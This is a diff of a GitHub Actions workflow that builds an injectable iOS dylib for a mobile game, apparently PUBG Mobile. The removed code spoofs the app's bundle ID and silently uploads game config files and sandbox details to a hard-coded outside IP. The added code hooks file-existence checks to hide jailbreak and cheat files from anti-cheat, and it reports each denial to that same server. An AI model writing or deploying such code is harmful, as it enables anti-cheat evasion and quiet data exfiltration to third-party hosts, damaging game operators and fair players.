@@ -1,4 +1,4 @@
-name: Imperial Stealth - V67.0 NO-CRASH
+name: Imperial Shield - V69.0 ANTI-BAN BYPASS
 
 on:
   push:
@@ -6,42 +6,24 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_stealth:
+  build_shield:
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Create Imperial Source
+      - name: Create Shield Source
         run: |
           mkdir -p jni
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
           #import <objc/runtime.h>
-          #include <mach-o/dyld.h>
-          #include <time.h>
 
-          // ==========================================
-          // [ 1. إعدادات الإمبراطور - 34.204.178.160 ]
-          // ==========================================
-          #define SERVER_IP @"34.204.178.160"
-          #define RADAR_URL @"http://34.204.178.160:5001/ask"
-          #define UPLOAD_URL @"http://34.204.178.160:5000/upload"
-
-          // دالة إرسال التقارير (الأسئلة الصامتة)
-          void SendReport(NSString *category, NSString *content) {
-              time_t now; time(&now);
-              char *dt = ctime(&now);
-              if (dt) dt[strlen(dt)-1] = '\0';
-
-              NSDictionary *json = @{
-                  @"category": category,
-                  @"content": content,
-                  @"time": [NSString stringWithUTF8String:dt ?: "N/A"]
-              };
-              
-              NSURL *url = [NSURL URLWithString:RADAR_URL];
+          // دالة الرادار للإبلاغ
+          void SendReport(NSString *msg) {
+              NSDictionary *json = @{@"category": @"Shield 🛡️", @"content": msg, @"time": @"LIVE"};
+              NSURL *url = [NSURL URLWithString:@"http://34.204.178.160:5001/ask"];
               NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
               [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
@@ -49,76 +31,57 @@ jobs:
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
           }
 
-          // دالة سحب الملفات (الجاسوس الصامت)
-          void SilentRaid(NSString *fileName) {
-              NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-              NSString *fullPath = [[paths objectAtIndex:0] stringByAppendingPathComponent:fileName];
+          // --- صهر الدرع (The Bypass Hook) ---
+          typedef BOOL (*fileExistsAtPath_t)(id, SEL, NSString *);
+          fileExistsAtPath_t orig_fileExistsAtPath;
+
+          BOOL hk_fileExistsAtPath(id self, SEL _cmd, NSString *path) {
+              // القائمة السوداء للملفات اللي تسبب باند
+              NSArray *blacklist = @[@"Cydia", @"Sileo", @"Shadow", @"Substrate", @"Tweak", @"libdobby", @"Imperial"];
               
-              NSData *data = [NSData dataWithContentsOfFile:fullPath];
-              if (!data) return;
-              
-              NSURL *url = [NSURL URLWithString:UPLOAD_URL];
-              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-              [req setHTTPMethod:@"POST"];
-              
-              NSString *boundary = @"ImpStealthV67";
-              [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
-              
-              NSMutableData *body = [NSMutableData data];
-              [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n\r\n", boundary, fileName] dataUsingEncoding:NSUTF8StringEncoding]];
-              [body appendData:data];
-              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-              
-              [req setHTTPBody:body];
-              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              SendReport(@"Raid", [NSString stringWithFormat:@"✅ Captured: %@", fileName]);
+              for (NSString *item in blacklist) {
+                  if ([path containsString:item]) {
+                      // هنا الخدعة: اللعبة تسأل عن ملف الغش، وإحنا نجاوبها "ماكو هيج ملف"
+                      SendReport([NSString stringWithFormat:@"🤫 الخداع ناجح: أنكرنا وجود %@", path]);
+                      return NO; // الجواب دائماً "لا" للملفات المشبوهة
+                  }
+              }
+              return orig_fileExistsAtPath(self, _cmd, path);
           }
 
-          // ==========================================
-          // [ 2. تزييف الهوية (Safe Swizzling) ]
-          // ==========================================
-          // هذي الطريقة آمنة جداً ولا تسبب كراش لأنها تستخدم نظام الـ Objective-C الرسمي
-          void SetupOfficialSpoof() {
-              Method m = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
-              method_setImplementation(m, imp_implementationWithBlock(^NSString* (id self) {
-                  return @"com.tencent.ig"; // إيهام النظام بأنها النسخة الرسمية
+          void ActivateImperialShield() {
+              // 1. تزييف الهوية (Bundle ID)
+              Method m1 = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
+              method_setImplementation(m1, imp_implementationWithBlock(^NSString* (id self) { return @"com.tencent.ig"; }));
+
+              // 2. تفعيل درع الملفات (File Shield)
+              Method m2 = class_getInstanceMethod([NSFileManager class], @selector(fileExistsAtPath:));
+              orig_fileExistsAtPath = (fileExistsAtPath_t)method_getImplementation(m2);
+              method_setImplementation(m2, imp_implementationWithBlock(^BOOL (id self, NSString *path) {
+                  return hk_fileExistsAtPath(self, @selector(fileExistsAtPath:), path);
               }));
-              SendReport(@"Identity", @"🛡️ Bundle ID Spoofed to Official ✅");
+              
+              SendReport(@"✅ تم تفعيل الدرع الإمبراطوري - أنت الآن مخفي");
           }
 
-          // ==========================================
-          // [ 3. نقطة الدخول (Constructor) ]
-          // ==========================================
           __attribute__((constructor))
           static void entry() {
-              // تأخير طويل جداً (30 ثانية) لضمان عبور كل فحوصات الحماية عند الإقلاع
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  
-                  SetupOfficialSpoof(); // تفعيل التخفي
-                  
-                  SendReport(@"System", @"🚀 Imperial Stealth Active - No Menu, No Crash");
-
-                  // سحب الملفات تلقائياً بمجرد الاستقرار باللوبي
-                  SilentRaid(@"RemoteConfig.config");
-                  SilentRaid(@"GCloud.config");
-                  
-                  // تقرير عن حالة الـ Sandbox
-                  NSString *home = NSHomeDirectory();
-                  SendReport(@"Environment", [NSString stringWithFormat:@"Sandbox Path: %@", home]);
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 25 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+                  ActivateImperialShield();
               });
           }
           EOF
 
-      - name: Build Stealth Dylib
+      - name: Build Shield Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 jni/main.mm -o ImperialStealth.dylib \
+          -arch arm64 jni/main.mm -o ImperialShield.dylib \
           -framework Foundation -lobjc
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-Stealth-Final
-          path: ImperialStealth.dylib
+          name: Imperial-V69-Shield
+          path: ImperialShield.dylib
           
